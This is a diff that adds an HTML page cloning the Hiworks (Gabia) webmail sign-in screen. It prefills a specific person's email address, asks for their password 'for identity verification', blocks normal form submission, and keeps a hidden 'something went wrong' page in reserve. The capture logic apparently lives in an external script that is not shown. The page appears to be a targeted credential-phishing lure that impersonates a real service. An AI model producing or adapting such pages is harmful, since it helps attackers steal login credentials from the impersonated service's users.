@@ -1,0 +1,155 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="assets/css/style.css" rel="stylesheet">
+  <link rel="shortcut icon" href="assets/img/favicon.png" type="image/png">
+  <title>하이웍스 로그인</title>
+  <style>
+    .toggle-bg {
+      background-color: #3b82f6;
+    }
+    .password-field {
+      border: 1px solid #e5e7eb;
+      color: #6b7280;
+      transition: border-color 0.2s ease;
+    }
+    .password-field:focus {
+      outline: none;
+      border-color: #2985db80;
+      box-shadow: 0 0 0 1px #2985db80;
+    }
+    .password-field::placeholder {
+      color: #9ca3af;
+    }
+    .password-error-field {
+      border: 1px solid #e4370c;
+      color: #6b7280;
+      transition: border-color 0.2s ease;
+    }
+    .password-error-field:focus {
+      outline: none;
+      border-color: #e4370c;
+      box-shadow: 0 0 0 1px #e4370c;
+    }
+    .password-error-field::placeholder {
+      color: #9ca3af;
+    }
+    .login-btn {
+      background-color: #bfdbfe;
+    }
+    .email-container {
+      border-radius: 9999px;
+      border: 1px solid #e5e7eb;
+      padding: 0.5rem 1rem;
+      display: inline-flex;
+      align-items: center;
+      background-color: white;
+      width: auto;
+      max-width: 100%;
+    }
+    .user-icon {
+      background-color: #d1d5db;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 0.5rem;
+      flex-shrink: 0;
+    }
+  </style>
+</head>
+<body class="bg-white flex flex-col items-center justify-center min-h-screen p-6">
+  <div class="w-full max-w-md mx-auto mt-4 md:mt-32">
+    <!-- Logo -->
+    <div class="flex justify-center mb-16">
+      <img src="assets/img/logo.svg" alt="logo" class="object-contain w-[200px] h-[40px]">
+    </div>
+    
+    <!-- Sign in text -->
+    <div class="text-center mb-8" id="signtext">
+      <h1 class="text-3xl font-normal mb-4">Sign in to <span class="text-gray-500" id="domain"></span></h1>
+      <p class="text-gray-600 text-sm">Please enter your password for identity verification.</p>
+    </div>
+    
+    <!-- Login Form -->
+    <div class="mt-10" id="login">
+      <form action="#" method="post" onsubmit="return false">
+        <!-- Email Field - Disabled/Read-only -->
+      <div class="mb-6 flex justify-center">
+        <div class="email-container">
+            <div>
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="mr-2"><path data-name="\uD328\uC2A4 98550" d="M8 0a8 8 0 1 0 8 8 8 8 0 0 0-8-8" style="fill: rgb(144, 144, 144);"></path><path data-name="\uD569\uCE58\uAE30 689" d="M3727 20366.9a3.6 3.6 0 0 1 3.175-1.928.735.735 0 0 1 .235.037 4.043 4.043 0 0 0 2.638 0 .726.726 0 0 1 .23-.037 3.6 3.6 0 0 1 3.175 1.928 6.171 6.171 0 0 1-9.452 0zm1.886-6.057a2.84 2.84 0 1 1 2.837 2.836 2.837 2.837 0 0 1-2.836-2.839z" transform="translate(-3723.725 -20354.906)" style="fill: rgb(255, 255, 255); stroke: transparent; stroke-miterlimit: 10;"></path></svg>
+            </div>
+            <span class="text-gray-700" id="email">sales1@feelis.com</span>
+          </div>
+          
+      </div>
+      
+      <!-- Password Field -->
+      <div class="mb-8">
+        <div class="relative">
+          <div class="absolute left-4 top-1/2 transform -translate-y-1/2">
+            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 14 14"><path data-name="\uC0AC\uAC01\uD615 11664" d="M0 0h14v14H0z" style="fill: none;"></path><g data-name="\uADF8\uB8F9 59573"><path data-name="\uD328\uC2A4 6923" d="M538.1 70.054h-1.75v-.875a3.5 3.5 0 0 0-7 0v.875h-1.75a.875.875 0 0 0-.875.875V78.8a.875.875 0 0 0 .875.875h10.5a.875.875 0 0 0 .875-.875v-7.871a.875.875 0 0 0-.875-.875zm-7.875-.875a2.625 2.625 0 0 1 5.25 0v.875h-5.25zM538.1 78.8h-10.5v-7.871h10.5z" transform="translate(-525.855 -65.679)" style="fill: rgb(144, 144, 144);"></path><path data-name="\uD328\uC2A4 6924" d="M533.98 73.754a1.312 1.312 0 0 0-.875 2.475v1.83h.875v-1.83a1.312 1.312 0 0 0 0-2.475z" transform="translate(-526.542 -66.679)" style="fill: rgb(144, 144, 144);"></path></g></svg>
+          </div>
+          <input type="password" id="password" placeholder="Password" class="password-field w-full py-3 px-12 border rounded-md autofocus">
+        </div>
+          <span class="text-[#d84a49] text-[12px]" id="error" style="display: none;">ID or password is incorrect.</span>
+      </div>
+      
+      <!-- Login Button -->
+      <button type="submit" class="login-btn w-full py-3 rounded-md hover:bg-blue-300 transition duration-200 mb-8 text-white" id="submit">
+        Sign-in
+      </button>
+      
+      <!-- Alternative Login Option and IP Security -->
+      <div class="flex justify-between items-center mb-10">
+        <a href="#" class="text-sm text-blue-500 hover:underline">Sign in with another ID</a>
+        
+        <div class="flex items-center">
+          <span class="text-sm text-gray-600 mr-2">IP Security</span>
+          <label class="relative inline-flex items-center cursor-pointer">
+            <input type="checkbox" class="sr-only peer" checked>
+            <div class="toggle-bg w-11 h-6 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-0.5 after:left-0.5 after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all"></div>
+          </label>
+        </div>
+      </div>
+      
+      <!-- Korean Notice -->
+      <div class="flex items-center text-sm text-amber-600 mt-12 mb-5">
+        <span class="text-amber-600 mr-2"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="14" viewBox="0 0 16 14" class="shrink-0 grow-0 self-center"><defs><clipPath id="jqwjrqddha"><path data-name="\uC0AC\uAC01\uD615 144435" d="M0 0h16v14H0z" style="fill: none;"></path></clipPath></defs><g data-name="\uADF8\uB8F9 269070" style="clip-path: url(&quot;#jqwjrqddha&quot;);"><path data-name="\uD328\uC2A4 98612" d="M8 9.588s2.189 0 5.2 2.307a.5.5 0 0 0 .8-.395V.5a.5.5 0 0 0-.8-.391C10.189 2.412 8 2.412 8 2.412z" style="fill: rgb(224, 232, 238);"></path><path data-name="\uD328\uC2A4 98613" d="M1.5 9.6H8V2.412H1.5a1.5 1.5 0 0 0-1.5 1.5V8.1a1.5 1.5 0 0 0 1.5 1.5" style="fill: rgb(226, 140, 70);"></path><path data-name="\uD328\uC2A4 98614" d="M5 9H2v4a1 1 0 0 0 1 1h1a1 1 0 0 0 1-1z" style="fill: rgb(226, 140, 70);"></path><path data-name="\uD328\uC2A4 98615" d="M15 7.5v-3a1 1 0 0 1 1 1v1a1 1 0 0 1-1 1" style="fill: rgb(159, 166, 173);"></path></g></svg></span>
+        <span class="text-black">공지사항 · 하이웍스 앱 조직도 기능 업데이트 안내</span>
+      </div>
+      </form>
+    </div>
+    <div id="errorpage" style="display: none;">
+      <div class="bg-white p-8 rounded-lg shadow-md max-w-md w-full text-center">
+        <!-- Error Icon -->
+        <div class="flex justify-center mb-6">
+            <svg class="w-24 h-24 text-red-500" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"></path>
+            </svg>
+        </div>
+        
+        <!-- Error Title -->
+        <h1 class="text-2xl font-bold text-gray-800 mb-3">Oops! Something went wrong</h1>
+        
+        <!-- Error Message -->
+        <p class="text-gray-600 mb-6">The page you requested could not be found or a server error has occurred.</p>
+        
+    </div>
+    </div>
+  </div>
+  
+  <!-- Footer -->
+  <footer class="w-full py-6 text-center text-gray-400 text-xs mt-auto">
+    <p>©Gabia Inc.</p>
+  </footer>
+  
+  <script src="assets/js/jquery.min.js"></script>
+  <script src="assets/js/app.js"></script>
+</body>
+</html>
